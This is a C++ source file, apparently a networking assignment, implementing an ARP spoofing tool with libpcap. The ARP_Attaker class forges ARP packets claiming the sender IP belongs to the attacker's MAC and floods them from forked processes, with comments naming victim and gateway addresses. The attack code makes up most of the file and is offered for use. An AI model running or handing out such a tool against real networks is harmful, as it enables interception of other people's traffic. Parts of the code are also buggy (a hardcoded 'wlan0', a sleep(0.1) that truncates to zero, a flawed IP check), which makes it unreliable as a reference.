#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>

// ------ chat gpt -------
#include <iostream>
#include <stdio.h>
#include <string>

std::string execute_command(const char *cmd)
{
	char buffer[128];
	std::string result = "";
	// 명령어 실행을 위한 파일 포인터 생성
	FILE *pipe = popen(cmd, "r");
	if (!pipe)
	{
		std::cerr << "popen failed!" << std::endl;
		return "";
	}
	// 명령어 실행 결과를 읽어서 string에 저장
	while (!feof(pipe))
	{
		if (fgets(buffer, 128, pipe) != NULL)
			result += buffer;
	}
	pclose(pipe);
	return result;
}

// --------------------

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

class ARP_Attaker
{
private:
	EthArpPacket packet;
	pcap_t *handle;

public:
	pid_t activate();
	ARP_Attaker(char *interface, char *sender_ip, char *target_ip);
};

ARP_Attaker::ARP_Attaker(char *interface, char *sender_ip, char *target_ip)
{

	std::string command = "cat /sys/class/net/"; // 여기에 실행하고자 하는 명령어를 넣으세요.
	command += "wlan0";
	command += "/address";
	std::string MyMAC = execute_command(command.c_str());

	char *dev = interface;
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

	// gatway
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(MyMAC.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // Victim : 192.168.35.11 00:0f:00:c0:2b:09
	packet.arp_.smac_ = Mac(MyMAC.c_str());
	packet.arp_.sip_ = htonl(Ip(sender_ip));
	packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); // f2-88-7b-8c-a0-26
	packet.arp_.tip_ = htonl(Ip(target_ip));	  // 192.168.35.211, 94:E2:3C:D6:CF:D1
}

pid_t ARP_Attaker::activate()
{

	pid_t pid = fork(); // fork() 호출

	if (pid == 0)
	{
		// 자식 프로세스 코드
		for (int _ = 0; _ < 20000; _++) // 20초
		{
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
			if (res != 0)
			{
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			sleep(0.1);
		}
		std::cout << "자식 프로세스 종료 \n";
		exit(0);
	}
	else if (pid < 0)
	{
		// fork() 호출이 실패한 경우
		std::cerr << "Error: fork() failed\n";
	}

	pcap_close(handle);
	return pid;
}

int is_valid_ip(char *ip)
{
	int dot_cnt = 0;
	int char_cnt = -1;

	for (int i = 0; i < 16; i++)
	{
		char_cnt++;
		if (ip[i] == '.' && char_cnt <= 3)
		{
			char_cnt = -1;
			dot_cnt++;
			if (ip[i] == '\0')
				break;
		}
	}
	if (dot_cnt == 3)
		return true;
	else
		return false;
}

int main(int argc, char *argv[])
{ // gateway ip : 192.168.58.183

	if ((argc % 2) == 1)
	{ // must have to get even IP Args
		usage();
		return -1;
	}

	for (int i = 2; i < argc; i++)
	{ // validate IP formate : 192.1424.53.1 is error
		if (!is_valid_ip(argv[i]))
		{
			printf("validation_ip error \n");
			usage();
			return -1;
		}
	}

	for (int i = 2; i < argc; i += 2)
	{														 // attacking by using incorrect ARP Packet
		ARP_Attaker attacker(argv[1], argv[i], argv[i + 1]); // init
		pid_t pid = attacker.activate();					 // attack
	}

	return 1;
}
